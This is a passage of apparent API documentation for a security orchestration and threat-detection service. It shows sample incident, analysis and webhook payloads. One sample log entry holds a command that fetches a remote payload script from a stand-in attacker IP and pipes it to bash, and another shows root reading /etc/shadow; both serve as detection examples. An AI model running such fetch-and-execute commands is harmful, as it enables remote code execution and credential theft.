        "weight": 0.25,
        "score": 70,
        "description": "Significant deviation from established behavioral patterns"
      },
      {
        "factor": "threat_intelligence_correlation",
        "weight": 0.15,
        "score": 85,
        "description": "IP address matches known threat indicators"
      }
    ],
    
    "ml_analysis": {
      "model_version": "behavioral_analysis_v3.2.1",
      "model_accuracy": 0.94,
      "feature_importance": [
        {
          "feature": "geographic_location",
          "importance": 0.35,
          "current_value": "anomalous"
        },
        {
          "feature": "temporal_patterns",
          "importance": 0.22,
          "current_value": "highly_unusual"
        },
        {
          "feature": "device_consistency",
          "importance": 0.18,
          "current_value": "completely_new"
        },
        {
          "feature": "access_patterns",
          "importance": 0.15,
          "current_value": "suspicious"
        },
        {
          "feature": "network_behavior",
          "importance": 0.10,
          "current_value": "automated_script"
        }
      ],
      "prediction_confidence": 0.89,
      "false_positive_probability": 0.11
    },
    
    "historical_context": {
      "previous_high_risk_events": [
        {
          "date": "2024-11-15T19:30:00Z",
          "risk_score": 65,
          "event": "login_from_new_device",
          "resolution": "user_verified_legitimate"
        }
      ],
      "risk_trend": {
        "direction": "increasing",
        "rate": 0.15,
        "time_period": "last_7_days"
      },
      "baseline_drift": {
        "detected": false,
        "last_recalibration": "2024-12-15T00:00:00Z"
      }
    },
    
    "recommended_actions": [
      {
        "action": "immediate_account_lock",
        "priority": "critical",
        "reasoning": "Multiple critical risk indicators suggest account compromise",
        "automated": true,
        "executed": true,
        "execution_time": "2025-01-28T02:31:00Z"
      },
      {
        "action": "require_additional_authentication",
        "priority": "high", 
        "reasoning": "If access is legitimate, additional verification is essential",
        "automated": false,
        "requires_user_interaction": true
      },
      {
        "action": "forensic_investigation",
        "priority": "high",
        "reasoning": "Pattern consistent with advanced threat actor",
        "assigned_to": "incident_response_team",
        "case_id": "CASE-2025-0128-001"
      },
      {
        "action": "credential_reset_enforcement",
        "priority": "medium",
        "reasoning": "Precautionary measure for suspected account compromise",
        "requires_approval": true
      }
    ]
  }
}
```

---

## AI-Powered Threat Detection

### POST /api/v1/ai-threat-detection/analyze

**Submit data for AI-powered threat analysis**

```http
POST /api/v1/ai-threat-detection/analyze
Content-Type: application/json
Authorization: Bearer <token>

{
  "analysis_request": {
    "request_id": "req_ai_2N4d7Hx9Kp1mQ8fR",
    "data_sources": [
      {
        "source_type": "network_traffic",
        "time_range": {
          "start": "2025-01-28T15:00:00Z",
          "end": "2025-01-28T16:00:00Z"
        },
        "data": {
          "flows": [
            {
              "src_ip": "10.0.1.15",
              "dst_ip": "203.0.113.45", 
              "src_port": 45231,
              "dst_port": 443,
              "protocol": "TCP",
              "bytes_sent": 15680,
              "bytes_received": 1048576,
              "duration": 300,
              "flags": ["SYN", "ACK", "PSH", "FIN"],
              "payload_entropy": 7.8,
              "tls_version": "1.3",
              "ja3_hash": "769,47-53,0-23-65281,29-23-24,0"
            }
          ],
          "dns_queries": [
            {
              "timestamp": "2025-01-28T15:25:00Z",
              "query": "malicious-c2.example",
              "query_type": "A",
              "response": "203.0.113.45",
              "response_time_ms": 250
            }
          ]
        }
      },
      {
        "source_type": "system_logs",
        "time_range": {
          "start": "2025-01-28T15:00:00Z", 
          "end": "2025-01-28T16:00:00Z"
        },
        "data": {
          "events": [
            {
              "timestamp": "2025-01-28T15:26:15Z",
              "host": "prod-web-01.example.com",
              "process": "apache2",
              "pid": 12345,
              "user": "www-data",
              "event_type": "process_creation",
              "command_line": "/bin/bash -c 'curl http://203.0.113.45/payload.sh | bash'",
              "parent_process": "apache2",
              "parent_pid": 1234
            },
            {
              "timestamp": "2025-01-28T15:27:22Z",
              "host": "prod-web-01.example.com", 
              "process": "bash",
              "pid": 54321,
              "user": "root",
              "event_type": "file_access",
              "file_path": "/etc/shadow",
              "operation": "read",
              "access_granted": true
            }
          ]
        }
      },
      {
        "source_type": "user_behavior",
        "time_range": {
          "start": "2025-01-28T02:00:00Z",
          "end": "2025-01-28T03:00:00Z"
        },
        "data": {
          "sessions": [
            {
              "user_id": "usr_2N4d7Hx9Kp1mQ8fR",
              "session_start": "2025-01-28T02:30:00Z",
              "source_ip": "203.0.113.45",
              "user_agent": "curl/7.68.0",
              "location": "Bucharest, RO",
              "actions": [
                {
                  "timestamp": "2025-01-28T02:31:00Z",
                  "action": "data_export",
                  "resource": "customer_database",
                  "records_exported": 15750,
                  "export_size_mb": 125
                }
              ]
            }
          ]
        }
      }
    ],
    "analysis_options": {
      "models": ["apt_detection", "insider_threat", "malware_analysis", "behavioral_anomaly"],
      "analysis_depth": "comprehensive",
      "include_attribution": true,
      "include_timeline_reconstruction": true,
      "correlation_window_hours": 24,
      "confidence_threshold": 0.7
    },
    "priority": "high",
    "callback_url": "https://your-app.com/webhooks/ai-analysis-complete"
  }
}
```

**Response (202):**
```json
{
  "analysis_job": {
    "job_id": "job_ai_2N4d7Hx9Kp1mQ8fR",
    "request_id": "req_ai_2N4d7Hx9Kp1mQ8fR",
    "status": "processing",
    "submitted_at": "2025-01-28T17:15:00Z",
    "estimated_completion": "2025-01-28T17:25:00Z",
    "data_sources_count": 3,
    "models_applied": 4,
    "progress": {
      "data_preprocessing": "completed",
      "feature_extraction": "in_progress", 
      "model_inference": "queued",
      "result_correlation": "queued",
      "report_generation": "queued"
    }
  }
}
```

### GET /api/v1/ai-threat-detection/analysis/{jobId}

**Get AI analysis results**

```http
GET /api/v1/ai-threat-detection/analysis/job_ai_2N4d7Hx9Kp1mQ8fR
Authorization: Bearer <token>
```

**Response (200):**
```json
{
  "analysis_result": {
    "job_id": "job_ai_2N4d7Hx9Kp1mQ8fR",
    "request_id": "req_ai_2N4d7Hx9Kp1mQ8fR",
    "status": "completed",
    "completed_at": "2025-01-28T17:23:45Z",
    "processing_time_seconds": 525,
    
    "overall_assessment": {
      "threat_detected": true,
      "threat_level": "critical",
      "confidence_score": 0.94,
      "threat_classification": "advanced_persistent_threat",
      "primary_indicators": [
        "multi_stage_attack_chain",
        "sophisticated_evasion_techniques", 
        "credential_harvesting",
        "data_exfiltration",
        "persistence_mechanisms"
      ]
    },
    
    "model_results": [
      {
        "model_name": "apt_detection_v2.1",
        "model_type": "deep_learning_ensemble",
        "confidence": 0.96,
        "threat_detected": true,
        "threat_category": "apt_campaign",
        "indicators": [
          {
            "indicator": "command_and_control_communication",
            "confidence": 0.98,
            "evidence": "Encrypted traffic to known APT infrastructure"
          },
          {
            "indicator": "lateral_movement_patterns",
            "confidence": 0.89, 
            "evidence": "Privilege escalation and internal reconnaissance"
          },
          {
            "indicator": "data_staging_behavior",
            "confidence": 0.93,
            "evidence": "Large data exports outside business hours"
          }
        ],
        "attribution": {
          "likely_threat_actor": "APT29 (Cozy Bear)",
          "confidence": 0.78,
          "supporting_evidence": [
            "TTP fingerprint match",
            "Infrastructure overlap",
            "Target profile consistency"
          ]
        }
      },
      {
        "model_name": "behavioral_anomaly_v1.8",
        "model_type": "unsupervised_clustering",
        "confidence": 0.91,
        "anomaly_detected": true,
        "anomaly_type": "user_behavior_deviation",
        "details": {
          "baseline_deviation_score": 8.7,
          "anomalous_features": [
            "geographic_location",
            "access_time", 
            "user_agent_pattern",
            "data_access_volume"
          ],
          "similarity_to_known_attacks": 0.85
        }
      },
      {
        "model_name": "malware_analysis_v3.0",
        "model_type": "static_dynamic_hybrid",
        "confidence": 0.88,
        "malware_detected": true,
        "malware_family": "custom_backdoor",
        "capabilities": [
          "remote_access",
          "keylogging",
          "screen_capture", 
          "file_exfiltration",
          "command_execution",
          "persistence"
        ],
        "sandbox_analysis": {
          "execution_time": 300,
          "network_connections": 3,
          "files_modified": 7,
          "registry_changes": 12,
          "behavioral_score": 0.94
        }
      }
    ],
    
    "attack_timeline": {
      "reconstruction_confidence": 0.89,
      "phases": [
        {
          "phase": "initial_access",
          "start_time": "2025-01-28T14:45:00Z",
          "duration_minutes": 15,
          "techniques": ["T1190"],
          "description": "Web application vulnerability exploitation",
          "evidence": [
            "Suspicious HTTP requests to /admin/upload.php",
            "File upload of malicious payload"
          ]
        },
        {
          "phase": "execution",
          "start_time": "2025-01-28T15:00:00Z",
          "duration_minutes": 5,
          "techniques": ["T1059.004"],
          "description": "Command execution via web shell",
          "evidence": [
            "Shell command execution through uploaded web shell",
            "Download and execution of additional tools"
          ]
        },
        {
          "phase": "privilege_escalation",
          "start_time": "2025-01-28T15:26:00Z", 
          "duration_minutes": 2,
          "techniques": ["T1068", "T1548.003"],
          "description": "Local privilege escalation to root",
          "evidence": [
            "Exploitation of kernel vulnerability",
            "Successful elevation to root privileges"
          ]
        },
        {
          "phase": "credential_access",
          "start_time": "2025-01-28T15:27:00Z",
          "duration_minutes": 3,
          "techniques": ["T1003.008"],
          "description": "Credential harvesting from system files", 
          "evidence": [
            "Access to /etc/shadow file",
            "Password hash extraction"
          ]
        },
        {
          "phase": "collection",
          "start_time": "2025-01-28T02:30:00Z",
          "duration_minutes": 30,
          "techniques": ["T1005"],
          "description": "Data collection from database systems",
          "evidence": [
            "Unauthorized database access",
            "Large-scale data querying and export"
          ]
        },
        {
          "phase": "exfiltration",
          "start_time": "2025-01-28T02:35:00Z",
          "duration_minutes": 25,
          "techniques": ["T1041"],
          "description": "Data exfiltration over C2 channel",
          "evidence": [
            "Encrypted data transmission to external server",
            "125MB data transfer to known malicious IP"
          ]
        }
      ]
    },
    
    "ioc_extraction": {
      "confidence": 0.92,
      "indicators": [
        {
          "type": "ip_address",
          "value": "203.0.113.45",
          "context": "C2 server communication",
          "confidence": 0.98
        },
        {
          "type": "domain",
          "value": "malicious-c2.example",
          "context": "Command and control domain",
          "confidence": 0.95
        },
        {
          "type": "file_hash",
          "value": "sha256:malware789abc...",
          "context": "Backdoor payload",
          "confidence": 0.97
        },
        {
          "type": "user_agent", 
          "value": "curl/7.68.0",
          "context": "Automated tool usage",
          "confidence": 0.85
        }
      ]
    },
    
    "risk_assessment": {
      "data_breach_likelihood": 0.95,
      "business_impact": "critical",
      "affected_systems_estimate": 3,
      "data_at_risk": {
        "customer_records": 15750,
        "financial_data": true,
        "intellectual_property": false,
        "employee_data": true
      },
      "containment_urgency": "immediate",
      "estimated_damage": "$500000-$2000000"
    },
    
    "recommended_response": {
      "immediate_actions": [
        "isolate_affected_systems",
        "block_malicious_infrastructure",
        "revoke_compromised_credentials",
        "activate_incident_response_team"
      ],
      "investigation_priorities": [
        "forensic_imaging_of_affected_systems",
        "malware_reverse_engineering",
        "scope_assessment",
        "data_breach_impact_analysis"
      ],
      "containment_strategy": "aggressive_isolation",
      "playbook_recommendations": [
        "pb_apt_response_comprehensive",
        "pb_data_breach_response"
      ]
    }
  }
}
```

---

## Webhook Events

The SOAR service supports webhooks for real-time notifications of security events and workflow updates.

### Webhook Configuration

```http
POST /api/v1/webhooks
Content-Type: application/json
Authorization: Bearer <token>

{
  "webhook": {
    "name": "Security Operations Center Notifications",
    "url": "https://your-app.com/webhooks/soar-events",
    "events": [
      "incident.created",
      "incident.updated",
      "incident.resolved",
      "playbook.started",
      "playbook.completed",
      "playbook.failed",
      "threat.detected",
      "analysis.completed"
    ],
    "filters": {
      "severity": ["critical", "high"],
      "categories": ["apt_detection", "malware", "data_breach"]
    },
    "authentication": {
      "type": "hmac_sha256",
      "secret": "your_webhook_secret"
    },
    "retry_policy": {
      "max_retries": 3,
      "retry_delay_seconds": 30,
      "exponential_backoff": true
    }
  }
}
```

### Sample Webhook Payloads

**Incident Created Event:**
```json
{
  "event_type": "incident.created",
  "event_id": "evt_2N4d7Hx9Kp1mQ8fR",
  "timestamp": "2025-01-28T16:00:00Z",
  "data": {
    "incident_id": "inc_2N4d7Hx9Kp1mQ8fR",
    "title": "Advanced Persistent Threat Detection",
    "severity": "critical",
    "category": "apt_detection",
    "status": "open",
    "created_by": "system:ml_detection_engine",
    "affected_assets_count": 3,
    "auto_assigned": true,
    "workflow_initiated": "pb_apt_response_comprehensive"
  }
}
```

**Threat Detected Event:**
```json
{
  "event_type": "threat.detected",
  "event_id": "evt_8Kx2Nv5mP9qR4tY7",
  "timestamp": "2025-01-28T15:29:30Z", 
  "data": {
    "detection_id": "det_2N4d7Hx9Kp1mQ8fR",
    "threat_type": "apt",
    "confidence_score": 0.95,
    "risk_score": 95,
    "affected_systems": ["prod-web-01.example.com"],
    "threat_actors": ["APT29"],
    "indicators": [
      {
        "type": "ip",
        "value": "203.0.113.45"
      }
    ],
    "incident_created": "inc_2N4d7Hx9Kp1mQ8fR"
  }
}
```

This comprehensive SOAR and Threat Detection API documentation provides detailed examples of:

1. **Advanced incident management** with rich context and forensic data
2. **Sophisticated playbook automation** with approval workflows and monitoring
3. **Comprehensive threat intelligence** with attribution and relationships
4. **AI-powered behavioral analysis** with machine learning insights
5. **Real-time webhook events** for system integration

The API is designed for enterprise security operations centers that need to handle complex threats with automated response capabilities while maintaining detailed audit trails and forensic evidence.